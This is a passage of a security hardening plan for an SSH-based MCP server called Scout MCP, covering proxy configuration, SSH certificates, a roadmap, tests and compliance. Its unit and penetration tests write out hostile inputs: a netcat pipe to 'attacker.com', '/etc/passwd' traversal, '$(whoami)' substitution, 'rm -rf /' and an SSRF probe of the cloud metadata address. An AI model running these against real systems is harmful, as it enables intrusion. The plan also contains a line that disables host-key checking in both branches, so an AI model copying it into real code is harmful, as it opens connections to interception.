      SCOUT_HTTP_PORT: 8000
      SCOUT_TLS_ENABLED: false  # TLS termination at reverse proxy

  nginx:
    image: nginx:alpine
    ports:
      - "443:443"  # Only HTTPS exposed
    networks:
      - internal
      - public
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
      - ./certs:/etc/nginx/certs:ro
    depends_on:
      - scout_mcp

networks:
  internal:
    driver: bridge
    internal: true  # No external access
  public:
    driver: bridge
```

**NGINX Reverse Proxy:**
```nginx
# nginx.conf
upstream scout_mcp {
    server scout_mcp:8000;
}

server {
    listen 443 ssl http2;
    server_name scout.example.com;

    # TLS 1.3 configuration
    ssl_protocols TLSv1.3;
    ssl_ciphers TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256;
    ssl_prefer_server_ciphers on;
    ssl_certificate /etc/nginx/certs/server.crt;
    ssl_certificate_key /etc/nginx/certs/server.key;

    # Security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;

    # Rate limiting (nginx-level)
    limit_req_zone $binary_remote_addr zone=scout:10m rate=10r/s;
    limit_req zone=scout burst=20 nodelay;

    location /mcp {
        proxy_pass http://scout_mcp;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # Timeout configuration
        proxy_connect_timeout 10s;
        proxy_send_timeout 30s;
        proxy_read_timeout 30s;
    }
}
```

**Sources:**
- [Azure Application Gateway TLS](https://learn.microsoft.com/en-us/azure/application-gateway/application-gateway-ssl-policy-overview)
- [Tailscale Bastion Hosts](https://tailscale.com/learn/bastion-hosts-vs-vpns)

---

## 7. SSH-Specific Security

### Current State
- Uses SSH key-based authentication
- One connection per host in pool
- 60-second idle timeout
- No SSH certificate support

### Industry Recommendations

**SSH Certificates vs. Keys (2025 Consensus):**
- Certificates provide auto-expiration, identity binding, revocation
- Eliminate TOFU warnings and key sprawl
- Used by Meta, Uber, Google for scale
- Trade-off: More setup complexity

**SSH Hardening:**
- Disable password authentication
- Use Ed25519 keys (preferred) or RSA 4096+
- Move SSH port from 22 to non-standard
- Implement connection timeouts
- Enable SSH multiplexing for performance

**Sources:**
- [Smallstep SSH Certificates](https://smallstep.com/blog/use-ssh-certificates/)
- [Infisical SSH Certificates Guide](https://infisical.com/blog/ssh-certificates-guide)
- [Teleport SSH Security](https://goteleport.com/blog/how-to-ssh-properly/)

### Recommended Implementation

#### Priority 1: SSH Certificate Support

```python
# scout_mcp/services/pool.py (updated)
from asyncssh import SSHClientConnectionOptions

async def create_connection(self, host: SSHHost) -> PooledConnection:
    """Create SSH connection with certificate support."""
    options = SSHClientConnectionOptions(
        # Prefer certificate authentication
        client_keys=[
            f"/home/{os.getlogin()}/.ssh/id_ed25519-cert.pub",  # Certificate
            f"/home/{os.getlogin()}/.ssh/id_ed25519",  # Fallback to key
        ],
        known_hosts=None if host.strict_host_key_checking == False else None,

        # Security hardening
        encryption_algs=["aes256-gcm@openssh.com", "chacha20-poly1305@openssh.com"],
        kex_algs=["curve25519-sha256", "diffie-hellman-group-exchange-sha256"],
        mac_algs=["hmac-sha2-256-etm@openssh.com", "hmac-sha2-512-etm@openssh.com"],

        # Connection timeouts
        connect_timeout=10,
        keepalive_interval=30,
        keepalive_count_max=3,
    )

    conn = await asyncssh.connect(
        host.hostname,
        port=host.port or 22,
        username=host.user,
        options=options,
    )

    return PooledConnection(connection=conn, hostname=host.hostname)
```

**Certificate Generation (for administrators):**
```bash
# Generate SSH CA
ssh-keygen -t ed25519 -f /etc/scout_mcp/ssh-ca -C "Scout MCP SSH CA"

# Sign user certificate (short-lived)
ssh-keygen -s /etc/scout_mcp/ssh-ca \
    -I "user@scout" \
    -n alice \
    -V +8h \
    ~/.ssh/id_ed25519.pub

# Server configuration (remote hosts)
# /etc/ssh/sshd_config
TrustedUserCAKeys /etc/ssh/ca.pub
```

#### Priority 2: SSH Connection Hardening

```python
# scout_mcp/config.py (updated)
SSH_PREFERRED_KEY_TYPES = [
    "ssh-ed25519-cert-v01@openssh.com",
    "ssh-ed25519",
    "rsa-sha2-512",
    "rsa-sha2-256",
]

SSH_ENCRYPTION_ALGS = [
    "aes256-gcm@openssh.com",
    "chacha20-poly1305@openssh.com",
]

SSH_MAC_ALGS = [
    "hmac-sha2-256-etm@openssh.com",
    "hmac-sha2-512-etm@openssh.com",
]

SSH_KEX_ALGS = [
    "curve25519-sha256",
    "diffie-hellman-group-exchange-sha256",
]

SSH_CONNECT_TIMEOUT = 10  # seconds
SSH_KEEPALIVE_INTERVAL = 30  # seconds
SSH_IDLE_TIMEOUT = 300  # 5 minutes (reduced from 60s)
```

#### Priority 3: SSH Multiplexing

For performance optimization with security:

```python
# scout_mcp/services/pool.py (updated)
async def create_connection(self, host: SSHHost) -> PooledConnection:
    """Create SSH connection with multiplexing."""
    options = SSHClientConnectionOptions(
        # Enable connection multiplexing
        session_factory=None,  # Default session
        agent_forwarding=False,  # NEVER forward agent (security risk)
        x11_forwarding=False,  # Disable X11
        compression_algs=["zlib@openssh.com", "none"],
    )

    # Connection pooling already provides multiplexing
    # (multiple commands over one TCP connection)
```

**Sources:**
- [Keyfactor SSH Key Management](https://www.keyfactor.com/blog/why-ssh-key-management-matters-in-modern-security/)
- [AppViewX SSH Certificates](https://www.appviewx.com/blogs/why-ssh-certificates-can-be-a-better-option-for-remote-access-than-ssh-keys/)

---

## 8. Implementation Roadmap

### Phase 1: Critical Security (Week 1)
**Goal:** Fix immediate vulnerabilities

- [ ] Implement OAuth 2.1 authentication with JWT validation
- [ ] Add path traversal prevention (PathValidator)
- [ ] Add command injection prevention (CommandValidator)
- [ ] Enable TLS 1.3 for HTTP transport
- [ ] Add basic rate limiting (global limits)

**Acceptance Criteria:**
- All MCP endpoints require valid Bearer token
- Path traversal attacks blocked (unit tests)
- Command injection attacks blocked (unit tests)
- HTTPS-only communication
- 429 responses for rate limit violations

### Phase 2: Authorization & Auditing (Week 2)
**Goal:** Control access and ensure compliance

- [ ] Implement RBAC with predefined roles
- [ ] Add per-endpoint rate limiting
- [ ] Implement structured audit logging
- [ ] Add user context to all operations
- [ ] Create audit log rotation and retention

**Acceptance Criteria:**
- Role-based access controls enforced
- Audit logs capture all security events
- Logs meet compliance requirements (HIPAA/PCI)
- Rate limits per user and endpoint
- Access denials logged with reason

### Phase 3: Advanced Security (Week 3)
**Goal:** Defense-in-depth and scalability

- [ ] Add mTLS support for service-to-service auth
- [ ] Implement SSH certificate authentication
- [ ] Add ABAC for dynamic policy decisions
- [ ] Set up reverse proxy with NGINX
- [ ] Configure network segmentation
- [ ] Implement certificate automation

**Acceptance Criteria:**
- mTLS authentication option available
- SSH certificates supported for remote hosts
- Complex authorization policies enforced
- Production-ready deployment architecture
- Automated certificate renewal

### Phase 4: Monitoring & Response (Week 4)
**Goal:** Detect and respond to threats

- [ ] Add security metrics (Prometheus)
- [ ] Implement anomaly detection
- [ ] Create security dashboards (Grafana)
- [ ] Add alerting for suspicious activity
- [ ] Implement automated response (IP blocking)
- [ ] Create incident response playbook

**Acceptance Criteria:**
- Real-time security metrics exported
- Anomalies trigger alerts
- Security team has visibility dashboard
- Automated blocking of attack patterns
- Documented incident response procedures

---

## 9. Security Testing

### Unit Tests

```python
# tests/test_security.py
import pytest
from scout_mcp.utils.validation import PathValidator, CommandValidator

class TestPathValidation:
    """Test path traversal prevention."""

    def test_blocks_parent_directory(self):
        with pytest.raises(ValueError, match="blocked pattern"):
            PathValidator.validate_path("../../etc/passwd")

    def test_blocks_home_expansion(self):
        with pytest.raises(ValueError, match="blocked pattern"):
            PathValidator.validate_path("~/../../etc/shadow")

    def test_blocks_command_substitution(self):
        with pytest.raises(ValueError, match="blocked pattern"):
            PathValidator.validate_path("/tmp/$(whoami)")

    def test_blocks_sensitive_paths(self):
        with pytest.raises(ValueError, match="sensitive path"):
            PathValidator.validate_path("/etc/passwd")

    def test_allows_safe_paths(self):
        path = PathValidator.validate_path("/var/log/app.log")
        assert path == "/var/log/app.log"

class TestCommandValidation:
    """Test command injection prevention."""

    def test_blocks_shell_metacharacters(self):
        with pytest.raises(ValueError, match="metacharacter"):
            CommandValidator.validate_command("cat /etc/passwd && whoami")

    def test_blocks_pipe_injection(self):
        with pytest.raises(ValueError, match="metacharacter"):
            CommandValidator.validate_command("ls | nc attacker.com 1234")

    def test_blocks_backtick_injection(self):
        with pytest.raises(ValueError, match="metacharacter"):
            CommandValidator.validate_command("echo `whoami`")

    def test_blocks_disallowed_commands(self):
        with pytest.raises(ValueError, match="not allowed"):
            CommandValidator.validate_command("rm -rf /")

    def test_allows_safe_commands(self):
        args = CommandValidator.validate_command("grep -r 'pattern' /var/log")
        assert args == ["grep", "-r", "pattern", "/var/log"]
```

### Integration Tests

```python
# tests/integration/test_auth.py
import pytest
from httpx import AsyncClient

@pytest.mark.asyncio
async def test_requires_authentication():
    """Test that MCP endpoints require authentication."""
    async with AsyncClient(base_url="https://localhost:8443") as client:
        response = await client.post("/mcp/tools/scout", json={"target": "hosts"})
        assert response.status_code == 401
        assert "WWW-Authenticate" in response.headers

@pytest.mark.asyncio
async def test_rejects_invalid_token():
    """Test that invalid tokens are rejected."""
    async with AsyncClient(base_url="https://localhost:8443") as client:
        response = await client.post(
            "/mcp/tools/scout",
            json={"target": "hosts"},
            headers={"Authorization": "Bearer invalid-token"},
        )
        assert response.status_code == 401

@pytest.mark.asyncio
async def test_enforces_rbac():
    """Test that RBAC policies are enforced."""
    readonly_token = generate_test_token(roles=["readonly"])

    async with AsyncClient(base_url="https://localhost:8443") as client:
        # Should allow read
        response = await client.post(
            "/mcp/tools/scout",
            json={"target": "dev-server:/var/log/app.log"},
            headers={"Authorization": f"Bearer {readonly_token}"},
        )
        assert response.status_code == 200

        # Should deny command execution
        response = await client.post(
            "/mcp/tools/scout",
            json={"target": "dev-server:/tmp", "command": "ls"},
            headers={"Authorization": f"Bearer {readonly_token}"},
        )
        assert response.status_code == 403
```

### Penetration Testing

```bash
# Path traversal tests
curl -X POST https://scout.example.com/mcp/tools/scout \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"target": "server:../../../../etc/passwd"}'
# Expected: 400 Bad Request (path validation)

# Command injection tests
curl -X POST https://scout.example.com/mcp/tools/scout \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"target": "server:/tmp", "command": "ls; whoami"}'
# Expected: 400 Bad Request (command validation)

# Rate limiting tests
for i in {1..100}; do
    curl -X POST https://scout.example.com/mcp/tools/scout \
        -H "Authorization: Bearer $TOKEN" \
        -d '{"target": "hosts"}' &
done
# Expected: 429 Too Many Requests after limit

# SSRF tests (if applicable)
curl -X POST https://scout.example.com/mcp/tools/scout \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"target": "http://169.254.169.254/latest/meta-data/"}'
# Expected: 400 Bad Request (invalid target format)
```

---

## 10. Compliance Checklist

### OWASP API Security Top 10

- [ ] **API1: Broken Object Level Authorization** - RBAC implementation ✅
- [ ] **API2: Broken Authentication** - OAuth 2.1 with MFA ✅
- [ ] **API3: Broken Object Property Level Authorization** - Path validation ✅
- [ ] **API4: Unrestricted Resource Consumption** - Rate limiting ✅
- [ ] **API5: Broken Function Level Authorization** - Command whitelisting ✅
- [ ] **API6: Unrestricted Access to Sensitive Business Flows** - Audit logging ✅
- [ ] **API7: Server Side Request Forgery** - Target validation ✅
- [ ] **API8: Security Misconfiguration** - TLS 1.3, secure defaults ✅
- [ ] **API9: Improper Inventory Management** - Host discovery controls ✅
- [ ] **API10: Unsafe Consumption of APIs** - SSH connection validation ✅

### MCP Security Best Practices

- [ ] No session-only authentication (use OAuth tokens) ✅
- [ ] No token passthrough (validate audience) ✅
- [ ] Secure session IDs (UUID with secure RNG) ✅
- [ ] User consent for proxy scenarios ✅
- [ ] Verify all inbound requests ✅

### Industry Standards

- [ ] **NIST 800-53** - Access control, audit logging, encryption
- [ ] **ISO 27001** - Information security management
- [ ] **SOC 2 Type II** - Security, availability, confidentiality
- [ ] **HIPAA** - ePHI protection (if applicable)
- [ ] **PCI-DSS** - Payment data security (if applicable)
- [ ] **GDPR** - Data privacy and protection (EU)

---

## 11. References

### Official Specifications
- [MCP Security Best Practices](https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices)
- [OAuth 2.1 Authorization Framework](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1)
- [RFC 8707: Resource Indicators](https://datatracker.ietf.org/doc/html/rfc8707)
- [RFC 9700: OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/rfc9700)

### Security Guides
- [InfraCloud: Securing MCP Servers](https://www.infracloud.io/blogs/securing-mcp-servers/)
- [Akto: MCP Security Best Practices](https://www.akto.io/blog/mcp-security-best-practices)
- [GitHub: Secure Remote MCP Servers](https://github.blog/ai-and-ml/generative-ai/how-to-build-secure-and-scalable-remote-mcp-servers/)
- [Microsoft: MCP Security Risks](https://techcommunity.microsoft.com/blog/microsoft-security-blog/understanding-and-mitigating-security-risks-in-mcp-implementations/4404667)

### API Security
- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger: Command Injection](https://portswigger.net/web-security/os-command-injection)
- [Cloudflare: OWASP API Top 10](https://www.cloudflare.com/learning/security/api/owasp-api-security-top-10/)

### SSH Security
- [Teleport: SSH Security Best Practices](https://goteleport.com/blog/how-to-ssh-properly/)
- [Teleport: SSH Bastion Hardening](https://goteleport.com/blog/security-hardening-ssh-bastion-best-practices/)
- [Smallstep: SSH Certificates](https://smallstep.com/blog/use-ssh-certificates/)
- [Infisical: SSH Certificates Guide](https://infisical.com/blog/ssh-certificates-guide)
- [HashiCorp Vault: SSH at Scale](https://www.hashicorp.com/en/blog/managing-ssh-access-at-scale-with-hashicorp-vault)

### TLS/Network Security
- [AWS: API Gateway TLS Policies](https://aws.amazon.com/blogs/compute/enhancing-api-security-with-amazon-api-gateway-tls-security-policies/)
- [Azure: Application Gateway TLS](https://learn.microsoft.com/en-us/azure/application-gateway/application-gateway-ssl-policy-overview)
- [GitGuardian: TLS Authentication](https://blog.gitguardian.com/a-complete-guide-to-transport-layer-security-tls-authentication/)

### Rate Limiting
- [Zuplo: API Rate Limiting Best Practices](https://zuplo.com/learning-center/10-best-practices-for-api-rate-limiting-in-2025)
- [Cloudflare: Rate Limiting Best Practices](https://developers.cloudflare.com/waf/rate-limiting-rules/best-practices/)
- [API7: Rate Limiting Strategies](https://api7.ai/learning-center/api-101/rate-limiting-strategies-for-api-management)

### Audit Logging & Compliance
- [BeyondTrust: Remote Access Auditing](https://www.beyondtrust.com/blog/entry/monitor-log--audit-remote-support-activity)
- [Splashtop: Compliance in Remote Access](https://www.splashtop.com/blog/compliance-in-remote-access)
- [Microsoft: Audit Logging](https://learn.microsoft.com/en-us/compliance/assurance/assurance-audit-logging)
- [CISA: Securing Remote Access Software](https://www.cisa.gov/sites/default/files/2023-06/Guide%20to%20Securing%20Remote%20Access%20Software_clean%20Final_508c.pdf)

### Standards Bodies
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [ISO/IEC 27001](https://www.iso.org/isoiec-27001-information-security.html)
- [PCI Security Standards](https://www.pcisecuritystandards.org/)
- [HIPAA Security Rule](https://www.hhs.gov/hipaa/for-professionals/security/index.html)

---

## Appendix: Quick Security Wins

**Can be implemented in < 1 day:**

1. **Enable HTTPS** - Generate self-signed cert, enable TLS in uvicorn
2. **Add health check auth** - Require API key for `/health` endpoint
3. **Implement basic rate limiting** - Token bucket with in-memory storage
4. **Add request logging** - Structured logs with IP, user, action
5. **Block common attacks** - Path validation for `..`, `~`, `$`
6. **Set security headers** - HSTS, X-Content-Type-Options, X-Frame-Options
7. **Change default port** - Move from 8000 to non-standard port
8. **Bind to localhost** - Set `SCOUT_HTTP_HOST=127.0.0.1`
9. **Add input size limits** - Reject requests > 1MB
10. **Enable CORS restrictions** - Whitelist allowed origins

**Configuration-only changes (no code):**
```bash
# .env
SCOUT_HTTP_HOST=127.0.0.1
SCOUT_HTTP_PORT=8443
SCOUT_TLS_ENABLED=true
SCOUT_TLS_CERT=/path/to/cert.pem
SCOUT_TLS_KEY=/path/to/key.pem
SCOUT_MAX_FILE_SIZE=1048576
SCOUT_COMMAND_TIMEOUT=30
SCOUT_LOG_LEVEL=INFO
```

---

**Document Version:** 1.0
**Last Updated:** 2025-12-03
**Next Review:** 2025-01-03
**Owner:** Security Team
